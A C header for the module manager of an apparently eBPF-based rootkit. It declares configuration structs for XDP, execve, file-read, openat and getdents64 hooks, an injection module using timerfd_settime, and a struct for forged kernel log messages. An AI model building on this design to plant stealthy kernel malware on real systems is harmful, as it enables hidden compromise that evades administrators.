#ifndef __MOD_MANAGER_H
#define __MOD_MANAGER_H

#include <stdint.h>
#include <unistd.h>
#include <linux/types.h>


#define ON 1
#define OFF 0

// 1. 统一定义常量（务必与内核态 defs.h 保持一致）
#define FAKE_KMSG_MAX_LEN 112
#define FAKE_KMSG_COUNT 30

// 2. 定义假日志结构体
// 使用 __attribute__((packed)) 确保内存布局与内核态完全严丝合缝
struct kmsg_data_t {
    __u64 len;
    char content[FAKE_KMSG_MAX_LEN - 8];
} __attribute__((packed));

// 3. 如果需要，也可以把其他的上下文结构体放进来
struct kmsg_read_ctx_t {
    void *buf;
    __u32 fd;
} __attribute__((packed));
//Centralized configutation struct.
//Used by the module manager to decide which modules to load
//If <all> is set in a module, the other configurations are ignored
typedef struct module_config_t{
    struct xdp_module {
        char all;
        char xdp_receive;
    } xdp_module;

    struct sched_module {
        char all;
        char handle_sched_process_exec;
    }sched_module;

    struct fs_module {
        char all;
        char tp_sys_enter_read;
        char tp_sys_exit_read;
        char tp_sys_enter_openat;
        char tp_sys_enter_getdents64;
        char tp_sys_exit_getdents64;
    }fs_module;

    struct exec_module {
        char all;
        char tp_sys_enter_execve;
    }exec_module;

    struct injection_module {
        char all;
        char sys_enter_timerfd_settime;
        char sys_exit_timerfd_settime;
        char sys_enter_openat;
    }injection_module;

} module_config_t;

//Configuration struct. Used by the module manager to
//correctly attach the needed modules, providing necessary params
typedef struct module_config_attr_t{
    struct kit_bpf *skel;
    struct xdp_module_attr {
        __u32 ifindex;
        __u32 flags;
    } xdp_module;

    struct sched_module_attr {
        void* __empty;
    }sched_module;

    struct fs_module_attr {
        void* __empty;
    }fs_module;

    struct exec_module_attr {
        void* __empty;
    }exec_module;

    struct injection_module_attr {
        void* __empty;
    }injection_module;

} module_config_attr_t;

//An unique module configutation struct and attr
extern module_config_t module_config;
extern module_config_attr_t module_config_attr;

/**
 * @brief Installs the ebpf modules according to the module_config
 * 
 * @return 0 if ok, -1 if error
 */
int setup_all_modules();

/**
 * @brief Removes all hooks, independently on the module_config.
 * Useful for reloading the modules.
 * 
 * @return 0 if ok, -1 if error
 */
int unhook_all_modules();

/**
 * @brief Sets the module_config with all hooks activated
 * 
 * @return 0 if ok, -1 if error
 */
int activate_all_modules_config();

/**
 * @brief Sets the module_config with all hooks deactivated
 * 
 * @return 0 if ok, -1 if error
 */
int deactivate_all_modules_config();

#endif